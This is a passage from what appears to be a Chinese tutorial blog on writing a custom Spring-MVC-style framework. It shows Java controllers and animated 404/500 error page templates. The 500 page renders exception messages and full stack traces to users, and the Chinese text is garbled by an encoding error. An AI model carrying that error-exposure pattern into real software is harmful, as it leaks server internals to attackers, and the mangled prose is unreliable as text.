class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><span class="hljs-params"><span class="hljs-meta">@MyRequestParam(&quot;name&quot;)</span> String name)</span>&#123;<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> queryService.query(name);<span class="hljs-keyword">return</span> out(response,result);&#125;<span class="hljs-meta">@MyRequestMapping(&quot;/add.json&quot;)</span><span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">add</span><span class="hljs-params">(HttpServletRequest request,HttpServletResponse response,</span><span class="hljs-params">   <span class="hljs-meta">@MyRequestParam(&quot;name&quot;)</span> String name,<span class="hljs-meta">@MyRequestParam(&quot;address&quot;)</span> String address)</span>&#123;<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-keyword">try</span> &#123;result = modifyService.add(name,address);<span class="hljs-keyword">return</span> out(response,result);&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<span class="hljs-comment">//e.printStackTrace();</span>Map&lt;String,Object&gt; model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String,Object&gt;();model.put(<span class="hljs-string">&quot;detail&quot;</span>,e.getCause().getMessage());<span class="hljs-comment">//System.out.println(Arrays.toString(e.getStackTrace()).replaceAll(&quot;\\[|\\]&quot;,&quot;&quot;));</span>model.put(<span class="hljs-string">&quot;stackTrace&quot;</span>, Arrays.toString(e.getStackTrace()).replaceAll(<span class="hljs-string">&quot;\\[|\\]&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyModelAndView</span>(<span class="hljs-string">&quot;500&quot;</span>,model);&#125;&#125;<span class="hljs-meta">@MyRequestMapping(&quot;/remove.json&quot;)</span><span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">remove</span><span class="hljs-params">(HttpServletRequest request,HttpServletResponse response,</span><span class="hljs-params">   <span class="hljs-meta">@MyRequestParam(&quot;id&quot;)</span> Integer id)</span>&#123;<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> modifyService.remove(id);<span class="hljs-keyword">return</span> out(response,result);&#125;<span class="hljs-meta">@MyRequestMapping(&quot;/edit.json&quot;)</span><span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">edit</span><span class="hljs-params">(HttpServletRequest request,HttpServletResponse response,</span><span class="hljs-params"><span class="hljs-meta">@MyRequestParam(&quot;id&quot;)</span> Integer id,</span><span class="hljs-params"><span class="hljs-meta">@MyRequestParam(&quot;name&quot;)</span> String name)</span>&#123;<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> modifyService.edit(id,name);<span class="hljs-keyword">return</span> out(response,result);&#125;<span class="hljs-keyword">private</span> MyModelAndView <span class="hljs-title function_">out</span><span class="hljs-params">(HttpServletResponse resp,String str)</span>&#123;<span class="hljs-keyword">try</span> &#123;resp.getWriter().write(str);&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;e.printStackTrace();&#125;<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;&#125;</code></pre></div></li><li><p>æ•´ä¸ªpageControllerç”¨æ¥æµ‹è¯•æ¨¡ç‰ˆæ¸²æŸ“</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.controller;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.QueryService;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.MyAutowired;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.MyController;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.MyRequestMapping;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.MyRequestParam;<span class="hljs-keyword">import</span> com.czh.spring.framework.webmvc.MyModelAndView;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-meta">@MyController</span><span class="hljs-meta">@MyRequestMapping(&quot;/&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageController</span> &#123;    <span class="hljs-meta">@MyAutowired</span>    QueryService queryService;    <span class="hljs-meta">@MyRequestMapping(&quot;/first.html&quot;)</span>    <span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">query</span><span class="hljs-params">(<span class="hljs-meta">@MyRequestParam(&quot;name&quot;)</span> String name)</span> &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> queryService.query(name);        Map&lt;String, Object&gt; model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();        model.put(<span class="hljs-string">&quot;name&quot;</span>, name);        model.put(<span class="hljs-string">&quot;hobby&quot;</span>,<span class="hljs-string">&quot;åƒå±&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyModelAndView</span>(<span class="hljs-string">&quot;first.html&quot;</span>, model);    &#125;&#125;</code></pre></div></li><li><p>æ¦‚è§ˆ</p><p><img src="https://img-blog.csdnimg.cn/0c4c6f4ba43d4f27a0faae18ffa0170c.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li></ul><h2 id="layoutsæ•´åˆå‰ç«¯èµ„æºæµ‹è¯•"><a href="#layoutsæ•´åˆå‰ç«¯èµ„æºæµ‹è¯•" class="headerlink" title="layoutsæ•´åˆå‰ç«¯èµ„æºæµ‹è¯•"></a>layoutsæ•´åˆå‰ç«¯èµ„æºæµ‹è¯•</h2><ul><li><p>æˆ‘ç”¨çš„æ¯”è¾ƒéªšçš„404.html</p><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;*&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;apple-mobile-web-app-status-bar-style&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;black&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;apple-mobile-web-app-capable&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;yes&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;format-detection&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;telephone=no&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/lib/layui/css/layui.css&quot;</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;all&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>        html&#123;background: #fff;&#125;        .error .clip .shadow &#123;height:180px;&#125;        .error .clip:nth-of-type(2) .shadow &#123;width:130px;&#125;        .error .clip:nth-of-type(1) .shadow,.error .clip:nth-of-type(3) .shadow &#123;width:250px;&#125;        .error .digit &#123;width:150px;height:150px;line-height:150px;font-size:120px;font-weight:bold;&#125;        .error h2 &#123;font-size:32px;&#125;        .error .msg &#123;top:-190px;left:30%;width:80px;height:80px;line-height:80px;font-size:32px;&#125;        .error span.triangle &#123;top:70%;right:0%;border-left:20px solid #535353;border-top:15px solid transparent;border-bottom:15px solid transparent;&#125;        .error .container-error-404 &#123;top: 50%;margin-top: 250px;position:relative;height:250px;padding-top:40px;&#125;        .error .container-error-404 .clip &#123;display:inline-block;transform:skew(-45deg);&#125;        .error .clip .shadow &#123;overflow:hidden;&#125;        .error .clip:nth-of-type(2) .shadow &#123;overflow:hidden;position:relative;box-shadow:inset 20px 0px 20px -15px rgba(150,150,150,0.8),20px 0px 20px -15px rgba(150,150,150,0.8);&#125;        .error .clip:nth-of-type(3) .shadow:after,.error .clip:nth-of-type(1) .shadow:after &#123;content:&quot;&quot;;position:absolute;right:-8px;bottom:0px;z-index:9999;height:100%;width:10px;background:linear-gradient(90deg,transparent,rgba(173,173,173,0.8),transparent);border-radius:50%;&#125;        .error .clip:nth-of-type(3) .shadow:after &#123;left:-8px;&#125;        .error .digit &#123;position:relative;top:8%;color:white;background:#1aa094;border-radius:50%;display:inline-block;transform:skew(45deg);&#125;        .error .clip:nth-of-type(2) .digit &#123;left:-10%;&#125;        .error .clip:nth-of-type(1) .digit &#123;right:-20%;&#125;        .error .clip:nth-of-type(3) .digit &#123;left:-20%;&#125;        .error h2 &#123;font-size:24px;color:#A2A2A2;font-weight:bold;padding-bottom:20px;&#125;        .error .tohome &#123;font-size:16px;color:#07B3F9;&#125;        .error .msg &#123;position:relative;z-index:9999;display:block;background:#535353;color:#A2A2A2;border-radius:50%;font-style:italic;&#125;        .error .triangle &#123;position:absolute;z-index:999;transform:rotate(45deg);content:&quot;&quot;;width:0;height:0;&#125;        @media(max-width:767px) &#123;.error .clip .shadow &#123;height:100px;&#125;            .error .clip:nth-of-type(2) .shadow &#123;width:80px;&#125;            .error .clip:nth-of-type(1) .shadow,.error .clip:nth-of-type(3) .shadow &#123;width:100px;&#125;            .error .digit &#123;width:80px;height:80px;line-height:80px;font-size:52px;&#125;            .error h2 &#123;font-size:18px;&#125;            .error .msg &#123;top:-110px;left:15%;width:40px;height:40px;line-height:40px;font-size:18px;&#125;            .error span.triangle &#123;top:70%;right:-3%;border-left:10px solid #535353;border-top:8px solid transparent;border-bottom:8px solid transparent;&#125;            .error .container-error-404 &#123;height:150px;&#125;        &#125;    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-floud&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: center&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-error-404&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit thirdDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit secondDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit firstDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span>OH!                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;triangle&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;h1&quot;</span>&gt;</span>å¾ˆæŠ±æ­‰ï¼Œä½ è®¿é—®çš„é¡µé¢æ‰¾ä¸åˆ°äº†<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/lib/layui/layui.js&quot;</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">randomNum</span>(<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">9</span>) + <span class="hljs-number">1</span>;</span><span class="language-javascript">    &#125;</span><span class="language-javascript"></span><span class="language-javascript">    <span class="hljs-keyword">var</span> loop1, loop2, loop3, time = <span class="hljs-number">30</span>, i = <span class="hljs-number">0</span>, number;</span><span class="language-javascript">    loop3 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">40</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop3);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.thirdDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">4</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.thirdDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript">    loop2 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">80</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop2);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.secondDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">0</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.secondDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript">    loop1 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">100</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop1);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.firstDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">4</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.firstDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div></li><li><p>æˆ‘ç”¨çš„æ¯”è¾ƒéªšçš„500.html</p><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;*&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;apple-mobile-web-app-status-bar-style&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;black&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;apple-mobile-web-app-capable&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;yes&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;format-detection&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;telephone=no&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/lib/layui/css/layui.css&quot;</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;all&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>        html&#123;background: #fff;&#125;        .error .clip .shadow &#123;height:180px;&#125;        .error .clip:nth-of-type(2) .shadow &#123;width:130px;&#125;        .error .clip:nth-of-type(1) .shadow,.error .clip:nth-of-type(3) .shadow &#123;width:250px;&#125;        .error .digit &#123;width:150px;height:150px;line-height:150px;font-size:120px;font-weight:bold;&#125;        .error h2 &#123;font-size:32px;&#125;        .error .msg &#123;top:-190px;left:30%;width:80px;height:80px;line-height:80px;font-size:32px;&#125;        .error span.triangle &#123;top:70%;right:0%;border-left:20px solid #535353;border-top:15px solid transparent;border-bottom:15px solid transparent;&#125;        .error .container-error-404 &#123;top: 50%;margin-top: 250px;position:relative;height:250px;padding-top:40px;&#125;        .error .container-error-404 .clip &#123;display:inline-block;transform:skew(-45deg);&#125;        .error .clip .shadow &#123;overflow:hidden;&#125;        .error .clip:nth-of-type(2) .shadow &#123;overflow:hidden;position:relative;box-shadow:inset 20px 0px 20px -15px rgba(150,150,150,0.8),20px 0px 20px -15px rgba(150,150,150,0.8);&#125;        .error .clip:nth-of-type(3) .shadow:after,.error .clip:nth-of-type(1) .shadow:after &#123;content:&quot;&quot;;position:absolute;right:-8px;bottom:0px;z-index:9999;height:100%;width:10px;background:linear-gradient(90deg,transparent,rgba(173,173,173,0.8),transparent);border-radius:50%;&#125;        .error .clip:nth-of-type(3) .shadow:after &#123;left:-8px;&#125;        .error .digit &#123;position:relative;top:8%;color:white;background:#1aa094;border-radius:50%;display:inline-block;transform:skew(45deg);&#125;        .error .clip:nth-of-type(2) .digit &#123;left:-10%;&#125;        .error .clip:nth-of-type(1) .digit &#123;right:-20%;&#125;        .error .clip:nth-of-type(3) .digit &#123;left:-20%;&#125;        .error h2 &#123;font-size:24px;color:#A2A2A2;font-weight:bold;padding-bottom:20px;&#125;        .error .tohome &#123;font-size:16px;color:#07B3F9;&#125;        .error .msg &#123;position:relative;z-index:9999;display:block;background:#535353;color:#A2A2A2;border-radius:50%;font-style:italic;&#125;        .error .triangle &#123;position:absolute;z-index:999;transform:rotate(45deg);content:&quot;&quot;;width:0;height:0;&#125;        @media(max-width:767px) &#123;.error .clip .shadow &#123;height:100px;&#125;            .error .clip:nth-of-type(2) .shadow &#123;width:80px;&#125;            .error .clip:nth-of-type(1) .shadow,.error .clip:nth-of-type(3) .shadow &#123;width:100px;&#125;            .error .digit &#123;width:80px;height:80px;line-height:80px;font-size:52px;&#125;            .error h2 &#123;font-size:18px;&#125;            .error .msg &#123;top:-110px;left:15%;width:40px;height:40px;line-height:40px;font-size:18px;&#125;            .error span.triangle &#123;top:70%;right:-3%;border-left:10px solid #535353;border-top:8px solid transparent;border-bottom:8px solid transparent;&#125;            .error .container-error-404 &#123;height:150px;&#125;        &#125;    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-floud&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: center&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-error-404&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit thirdDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit secondDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit firstDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span>OH!                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;triangle&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;h1&quot;</span>&gt;</span>o(â•¥ï¹â•¥)oå¾ˆæŠ±æ­‰ï¼Œç³»ç»Ÿé”™è¯¯å’¯~~ èµ¶ç´§è”ç³»ç®¡ç†å‘˜å§<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;h1&quot;</span>&gt;</span>Message:ï¿¥&#123;detail&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;h1&quot;</span>&gt;</span>StackTrace:ï¿¥&#123;stackTrace&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;h1&quot;</span>&gt;</span>Copyright@luelueking<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/lib/layui/layui.js&quot;</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span 